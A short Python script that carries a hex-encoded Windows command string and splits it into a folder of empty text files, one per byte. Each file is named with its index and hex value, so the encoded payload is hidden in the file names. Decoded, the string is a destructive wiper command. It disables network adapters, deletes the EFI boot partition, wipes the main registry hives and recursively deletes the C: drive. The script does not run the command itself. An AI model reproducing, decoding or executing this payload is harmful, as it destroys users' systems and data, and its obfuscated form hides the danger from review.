import os

# Hex command
hex_command = "43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 5C 63 6D 64 2E 65 78 65 20 2F 6D 69 6E 20 2F 63 20 22 63 61 6C 6C 20 40 65 63 68 6F 20 6F 66 66 20 26 20 63 61 6C 6C 20 64 61 74 65 20 33 31 2E 31 32 2E 32 30 33 38 20 26 20 63 61 6C 6C 20 77 6D 69 63 20 70 61 74 68 20 77 69 6E 33 32 5F 6E 65 74 77 6F 72 6B 61 64 61 70 74 65 72 20 77 68 65 72 65 20 5C 22 4E 65 74 45 6E 61 62 6C 65 64 3D 74 72 75 65 5C 22 20 63 61 6C 6C 20 64 69 73 61 62 6C 65 20 26 20 63 61 6C 6C 20 74 69 6D 65 6F 75 74 20 2F 74 20 31 30 20 2F 6E 6F 62 72 65 61 6B 20 26 20 63 61 6C 6C 20 6D 6F 75 6E 74 76 6F 6C 20 78 3A 20 2F 73 20 26 20 63 61 6C 6C 20 69 63 61 63 6C 73 20 78 3A 20 26 20 63 61 6C 6C 20 72 64 20 78 3A 20 2F 73 20 2F 71 20 26 20 63 61 6C 6C 20 72 65 67 20 64 65 6C 65 74 65 20 48 4B 43 52 20 2F 66 20 26 20 63 61 6C 6C 20 72 65 67 20 64 65 6C 65 74 65 20 48 4B 43 55 20 2F 66 20 26 20 63 61 6C 6C 20 72 65 67 20 64 65 6C 65 74 65 20 48 4B 4C 4D 20 2F 66 20 26 20 63 61 6C 6C 20 72 65 67 20 64 65 6C 65 74 65 20 48 4B 55 20 2F 66 20 26 20 63 61 6C 6C 20 72 65 67 20 64 65 6C 65 74 65 20 48 4B 43 43 20 2F 66 20 26 20 63 61 6C 6C 20 69 63 61 63 6C 73 20 63 3A 20 26 20 63 61 6C 6C 20 72 64 20 63 3A 20 2F 73 20 2F 71"

# Folder name
folder_name = "hexdata"
os.makedirs(folder_name, exist_ok=True)

# Process hex characters and create empty files
for index, hex_char in enumerate(hex_command.split(), start=1):
    # Create a filename with the index (no zero padding)
    file_name = f"{index}_{hex_char.replace(' ', '')}.txt"
    file_path = os.path.join(folder_name, file_name)
    
    # Create the empty file
    with open(file_path, 'w') as f:
        pass  # Leave the file empty

print("Empty files have been created.")
